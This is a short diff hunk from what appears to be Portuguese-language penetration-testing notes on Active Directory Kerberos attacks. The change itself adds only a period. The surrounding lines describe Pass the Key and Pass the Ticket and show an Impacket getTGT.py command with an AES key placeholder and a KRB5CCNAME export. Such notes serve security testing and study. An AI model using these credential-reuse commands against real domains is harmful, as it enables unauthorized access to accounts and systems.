@@ -8742,6 +8742,7 @@ Pass the Key
 PRECISA TER A SECRET KEY DO USER ATRAVEZ DO MIMIKATZ ou DCSYNC, MAS É NECESSARIO PRIVILEGIOS
 Pass the Ticket
 PRECISA TER ACESSO AO SERVIDOR QUE TENHA O TICKET VALIDO EM CACHE
+.
 
  	getTGT.py -aesKey 'kerberosKey' $domain/$user@target
 	export KRB5CCNAME=/tmp/ticket.ccache
